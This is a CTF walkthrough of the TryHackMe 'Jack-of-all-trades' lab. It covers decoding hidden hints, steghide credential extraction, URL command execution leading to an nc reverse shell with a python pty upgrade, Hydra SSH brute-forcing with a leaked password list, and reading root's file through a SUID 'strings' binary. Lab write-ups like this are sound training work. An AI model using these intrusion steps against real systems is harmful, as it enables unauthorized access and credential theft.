first thing i always do before approaching any CTF challange, I start with creating a dedicated directory on my Kali machine to store important credentials, outputs and clues that'll help me along the way.

`mkdir ~/Desktop/thm/rooms/jack-of-all-trades`

upon receiving the target's IP address, i ran a quick `nmap` scan only to notice something funny (this was so confusing to me i had to run the scan 3 times):

```
nmap -sC -sV -Pn {{TARGET-IP}}
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 01:02 IDT
Nmap scan report for 10.10.241.208
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.49 seconds
```

the funny thing about this machine is that the HTTP server is actually running on port 22, and SSH is running on port 80.

trying to access the HTTP webpage using port 22 in FireFox was unseccusful for me, which led me to learn about how often your browser will block odd ports for the sake of security:

<img width="845" height="271" alt="image" src="https://github.com/user-attachments/assets/0463e7a0-7f71-493e-8199-cc59f6dce3f6" />

to overcome the restriction, i did the following:

- in the address bar, type : `about:config`
- Search for `network.security.ports.banned.override`
- If it doesn't exist, create it:

    Right-click → New → String
    Name: `network.security.ports.banned.override`
    Value: 22
  - restart FireFox
 
  after that i managed to access the website successfully.


  in the webpage, i noticed there were 3 images worth checking out (the dinosaur, the toy and the header image)

  <img width="1917" height="881" alt="image" src="https://github.com/user-attachments/assets/cd75051c-e0ef-4df1-8db5-70be89bd2005" />

  so i saved them on my machine for later exploring.


  usually, the first thing i would do when approaching a webpage, is i would check the source page (`crl+U`):

```
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```

quickly captured the encoded text in the hidden note, decoded it from base64 (you can use cyberchef, or simply echo it in your terminal with `| base64 -d` in the end).

the decoded message:

"Remember to wish Johnny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?-------"

i documented the name - Johnny Graves, and the password i found in a dedicated file, we'll see later what it's used for.

another thing worth noting about the hidden note in the source page is /recovery.php, so next i went to see what was there:

<img width="1399" height="291" alt="image" src="https://github.com/user-attachments/assets/8ba79752-bd54-4805-8df7-9eaac9e41194" />

very cute. let's see if we can find anything useful in the source page for recovery.php:

```
<!DOCTYPE html>
<html>
	<head>
		<title>Recovery Page</title>
		<style>
			body{
				text-align: center;
			}
		</style>
	</head>
	<body>
		<h1>Hello Jack! Did you forget your machine password again?..</h1>	
		<form action="/recovery.php" method="POST">
			<label>Username:</label><br>
			<input name="user" type="text"><br>
			<label>Password:</label><br>
			<input name="pass" type="password"><br>
			<input type="submit" value="Submit">
		</form>
		<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
		 
	</body>
</html>
```

yet another encoded message!

went back to cyberchef, and decoded the message from base32:


<img width="868" height="577" alt="image" src="https://github.com/user-attachments/assets/f3c9bfa1-0f57-4eb8-8d31-283ec45eb5d0" />

the outputs seems to be hexadecimal, so i went to RapidTables Hex to String Converter to reveal the message:

<img width="619" height="709" alt="image" src="https://github.com/user-attachments/assets/d1adb2cd-cecf-4b86-85bb-962de3ba66f4" />

this looks very much like a rotation encoding of some sort.

at this point i started thinking about trying to figure out who this Johnny Graves person might be. And after the simplest of google searches, Johnny's MySpace page was revealed:

<img width="1153" height="691" alt="image" src="https://github.com/user-attachments/assets/30e6789b-f355-457b-bc66-3f5982dfd276" />

very fun. we can see that mr. Graves plearly loves encoding messages with ROT13 and then base32. That should be our way to finally read his message.

<img width="1243" height="582" alt="image" src="https://github.com/user-attachments/assets/f7323e6d-05ed-4a5e-8c26-e8b766c9b8d4" />

awesome, now we have another hint, which is a bit.ly url. let's go there and check it out!

<img width="1235" height="843" alt="image" src="https://github.com/user-attachments/assets/cc00bdc6-7db5-4667-9d11-d3ef8ed94c1a" />

the link lead me to the wikipedia page of Stegosauria. Perhaps this key word will be useful later, so i'll leave this tab open for now.

okay! let's check the pictures we downloaded from the webpage, using steghide:

`steghide --extract -sf stego.jpg`

it prompts us for a passphrase, but if you leave it blank it doesnt extract the data.

let's try with the password we found earlier:

```
steghide --extract -sf stego.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```

great! so as it turns out, the password we found was indeed meant for these data extractions.

running `cat creds.txt`, we are given this output:

<img width="362" height="77" alt="image" src="https://github.com/user-attachments/assets/a78866f0-313d-4d25-b6d9-99816ff18daf" />

okay. so lets try the same thing for the other images [using the same passphrase as before]:

```
steghide --extract -sf header.jpg
Enter passphrase: 
wrote extracted data to "cms.creds".
```

(when i tried to do the same for the jackinthebox.jpg image, i found that the passphrase i found wasn't the correct one.)

lets read the cms.creds file [which will hopefully be useful since we do need some creds for that CMS lol]:

```
cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: Tp-------
```

awesome, so now we can log into the recovery.php page!

<img width="1109" height="188" alt="image" src="https://github.com/user-attachments/assets/dfd06a6c-9d60-4dcd-8a94-15e299f5ed34" />

this is the page we get:

<img width="669" height="133" alt="image" src="https://github.com/user-attachments/assets/37e40296-841d-48d0-96bc-98239197b1fc" />

so, what i tried to do is to see if i can execute cmd commands from the url:

<img width="465" height="30" alt="image" src="https://github.com/user-attachments/assets/37efbdc8-d705-49f7-9d30-11d793dd6fb0" />

and indeed i could:

<img width="897" height="123" alt="image" src="https://github.com/user-attachments/assets/eeaf4ae7-38c1-4cb4-b341-5799d3d4b153" />

great! so now i can try to read the user.txt flag. but from my experience, it's unlikely i can read files stored in some users homefolder using the url command execution method, so instead i tried to get a reverse shell.

to achieve that, first i went to the handy site of https://www.revshells.com/ in which i generated a revshell command fitted to my machine's IP address and my `netcat` listener's port.

i generated an `nc -c` reverse shell command, started a listener (`nc -nlvp 4444`) and pasted the command in the url, only to successfully get a revshell:

```
nc -nlvp 4444     
listening on [any] 4444 ...
connect to [10.9.4.95] from (UNKNOWN) [10.10.234.46] 60685
whoami
www-data
```

awesome. now i wanted to upgrade my reverse shell into an interactive shell, which i achieved by running the good old `python -c 'import pty; pty.spawn("/bin/bash")'` command on the target's machine.


now i can try to navigate through the filesystem to hopefully find the user.txt flag inside one of the homedirectories:

```
www-data@jack-of-all-trades:/$ cd home
cd home
www-data@jack-of-all-trades:/home$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 29  2020 .
drwxr-xr-x 23 root root 4096 Feb 29  2020 ..
drwxr-x---  3 jack jack 4096 Feb 29  2020 jack
-rw-r--r--  1 root root  408 Feb 29  2020 jacks_password_list
www-data@jack-of-all-trades:/home$ cd jack
cd jack
bash: cd: jack: Permission denied
```

okay, so as we can see, we currently do not have permission to access jack's home dir. BUT, we did find a password list!

```
www-data@jack-of-all-trades:/home$ cat jacks_password_list
cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

so what i did, i copied the contents of the list into a dedicated file on my kali machine, and next up is trying to bruteforce the ssh login for the user Jack, using the wordlist.

using the beloved tool `Hydra`, i was able to find Jack's password [don't forget that on the target machine, SSH is running on port 80!!!]:

```
hydra -l jack -P wlist.txt ssh://10.10.234.46:80/                     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-30 01:28:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.234.46:80/
[80][ssh] host: 10.10.234.46   login: jack   password: IT-----------
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-30 01:28:22
```

amazing. we got jack's password! using these credentials, we can finally SSH into jack's user:

`ssh jack@10.10.234.46 -p80`

upon listing what Jack has in his homedir, i found that the flag is not in it's usual .txt format, but this time it's an .jpg file. Friendly suggestion, don't rush to cat every single user.something file you find because it did clutter my terminal :/


i scp'd the image file to my kali machine for further investigation:

```
jack@jack-of-all-trades:~$ scp user.jpg kali@10.9.4.95:~/Desktop/thm/rooms/jack-of-all-trages/
kali@10.9.4.95's password: 
user.jpg                                                                          100%  286KB 286.4KB/s   00:00
```

great. i took a look at the picture:

<img width="991" height="759" alt="image" src="https://github.com/user-attachments/assets/7dd65d2c-9008-4d32-93d6-433def11978f" />

and here's our first flag.

cool! now what's left to do is to try and privilege escalate to read the root.txt flag.

i first tried `sudo -l` to see if Jack can run anything as sudo:

```
jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack: 
Sorry, user jack may not run sudo on jack-of-all-trades.
```

okay, seems not. let's try to see what binaries have the SUID bit attached to them:

```
jack@jack-of-all-trades:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```

let's try to use the strings command to try and read root.txt:

```
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: sec*********_{****************************}
```

and there is our root flag!
